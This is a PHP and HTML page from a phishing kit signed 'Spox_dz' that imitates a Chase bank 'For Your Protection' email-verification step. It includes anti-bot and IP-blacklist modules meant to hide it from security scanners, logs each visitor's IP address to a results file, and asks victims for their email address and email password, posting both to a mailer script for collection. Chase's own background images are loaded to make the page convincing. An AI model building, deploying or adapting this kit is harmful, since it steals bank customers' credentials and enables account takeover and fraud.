<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Spox/Chase_Result/total_email_access_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>For Your Protection</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="Spox/Files/img/chasefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="Spox/Files/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="Spox/Files/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="Spox/Files/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="Spox/Files/img/chase-touch-icon.png">
        <link rel="stylesheet" href="Spox/Files/css/logon.css">
        <link rel="stylesheet" href="Spox/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="Spox/Files/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
    <style type="text/css">
    .help-block.form-error{
        color:#bf2155;
    }

.jpui.alert.primary .title {
    font-size: 1rem;
    color: #bf2155;
}
.jpui.alert.primary.inverted {
    color: #bf2155!important;
}
.jpui.alert.primary {
    background-color: #bf2155;
}
.jpui.icon.error {
    background-color: inherit!important;
    color: #bf2155!important;
}

.icon{display:none}@font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url(Spox/Files/css/fonts/fonts/dcefont.eot);src:url(Spox/Files/css/fonts/dcefont.eot?#iefix) format('embedded-opentype'),url(Spox/Files/css/fonts/dcefont.woff) format('woff'),url(Spox/Files/css/fonts/dcefont.ttf) format('truetype'),url(Spox/Files/css/fonts/dcefont.svg#dcefont) format('svg')}

</style>
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">SPOX LOVE YOU !</span>
</a> 
</div>
</header>
<form action="Spox/Mail/Mail2" method="POST">
<input type="hidden" name="token" value="chaseSP0X">
<main id="logon-content" data-has-view="true">
<div class="msd password-reset reset-code" data-is-view="true">
<div id="backgroundImage">
<div class="jpui background image fixed blurred" id="geoImage">
<style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.12.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.12.jpeg); } }</style>

</div>
</div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
    <h1 class="header" tabindex="-1">For Your Protection</h1>
<div class="row jpui panel body">
<div class="col-xs-12 col-sm-10 col-sm-offset-1">
<div class="progress u-no-outline" id="progress" tabindex="-1">
<div class="row">
<div class="col-xs-12 col-sm-6 clear-padding">
</div>
<div class="col-xs-12 col-sm-6 progress-padding">
<div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
<ol class="steps-3" role="presentation">
    <li class="active"></li>
    <li class="active current-step"></li>
    <li id="progress-progressBar-step-3"></li>
</ol>


</div>
</div>
</div>
</div>
<style type="text/css">
    .jpui.alert.spox.spox .title {
    font-size: 1rem;
    font-weight: 300;
    color: #bf2155;
    letter-spacing: 0;
    text-decoration: none;
    width: 100%;
    margin: .0625rem .0625rem .313rem 0;
}

</style>



<form  method="POST" autocomplete="off" action="javascript:void(0);" novalidate="">
    <h3>Email authentication </h3ext>
    <p>For Your identification, We need you to sign-in to your registered email which we have in our records.</p>
        <?php 
    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "email";
    if ($invalid == $em) {
        echo'<div class="validator-error-header"><div class="jpui error error jpui spox spox inverted primary animate alert" aria-labelledby="inner-alert-the-user"><i class="jpui exclamation-color error error icon"></i> <div class="icon background"></div> <div class="content wrap" ><h2 class="title" tabindex="-1" ><span class="util accessible-text">Important: </span >We couldnt find any records that match the details you entered.<br> Please try again!</h2>   </div></div></div><input type="hidden" name="invalid" value="invalid">';}}?>

<div class="inside-container">
<div class="row">
<div class="col-xs-12 col-sm-5 label-column otp-code">
    <label class="jpui label msdLabelHeightFix">
        <span class="accessible-text hidden"></span>Email address </label>
</div>
<div class="col-xs-12 col-sm-5 form-column otp-code">
<div class="account-input ssn_card_account_number">
    <input class="jpui input account-input ssn_card_account_number" data-validation="email"  placeholder="" type="text" name="email_address"  data-validation-error-msg="  ">    </div>
</div>
</div>
<div class="row">
<div class="col-xs-12 col-sm-5 label-column">
    <label class="jpui label">
    <span class="accessible-text hidden"></span>Password</label>
</div>
<div class="col-xs-12 col-sm-5 form-column">
<div class="margin-bottom-20px" id="password_input">
<input class="jpui input margin-bottom-20px" placeholder="" type="password" data-validation="length" data-validation-length="min4-30" name="email_password" data-validation-error-msg=" ">
</div>
</div>
</div>
<p class="identification-code-received-message">
<span>We ask you to verify your email to add this device as <a class="link-anchor underline" href="javascript:void(0);" >Trusted Devices,</a>and safeguard your account from any unauthorized login from unknown device.</span>
<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
</span>
</p>
</div>
<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid ">
    <span class="label">Cancel</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary ">
    <span class="label">Next</span>
</button>
</div>
</div>
</form></div></div></div></div></div></div>
</main>
</div>
</div> 
</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});
$(document).ready(function() {
    $("#submit").submit(function(e) {
        $("#errordiv").hide();
    });
});

</script>

</body>
</html>